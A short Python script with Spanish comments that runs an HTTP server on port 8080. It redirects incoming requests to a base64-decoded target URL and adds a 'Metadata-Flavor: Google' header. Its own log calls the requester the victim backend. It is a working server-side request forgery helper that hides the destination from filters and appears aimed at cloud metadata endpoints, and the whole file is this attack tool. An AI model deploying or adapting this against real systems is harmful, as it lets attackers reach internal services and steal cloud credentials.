from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import base64

class ObfuscatedRedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        
        # Obtiene el valor del parámetro 'data'
        encoded_data = query_components.get("data", [None])[0]

        if encoded_data:
            try:
                # Decodifica la URL de destino
                target = base64.b64decode(encoded_data).decode('utf-8')
                print(f"[+] Redirigiendo backend victima hacia: {target}")
                
                self.send_response(302)
                self.send_header('Location', target)
                self.send_header('Metadata-Flavor', 'Google')
                self.end_headers()
            except Exception as e:
                self.send_error(400, "Invalid encoding")
        else:
            self.send_error(404, "No target specified")

print("Servidor de redirección por Base64 iniciado en puerto 8080...")
HTTPServer(('', 8080), ObfuscatedRedirectHandler).serve_forever()
